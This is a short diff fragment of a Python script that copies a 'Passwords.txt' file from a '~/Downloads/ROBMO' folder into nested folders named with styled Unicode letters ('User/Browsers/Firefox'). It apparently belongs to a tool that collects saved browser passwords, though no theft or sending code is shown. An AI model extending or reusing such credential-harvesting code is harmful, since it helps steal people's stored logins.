@@ -324,12 +324,13 @@ with open('Passwords.txt', 'w', encoding="utf-8") as f:
 
 import os
 import shutil
+import time
 
 download_folder = os.path.join(os.path.expanduser("~"), 'Downloads', 'ROBMO')
 
 source_path = os.path.join(download_folder, 'Passwords.txt')
 
-firefox_folder = os.path.join(os.path.expanduser("~"), '𝐔𝐬𝐞𝐫', '𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬')
+firefox_folder = os.path.join(os.path.expanduser("~"), '𝐔𝐬𝐞𝐫', '𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬', '𝐅𝐢𝐫𝐞𝐟𝐨𝐱')
 destination_path = os.path.join(firefox_folder, 'Passwords.txt')
 
 if not os.path.exists(firefox_folder):
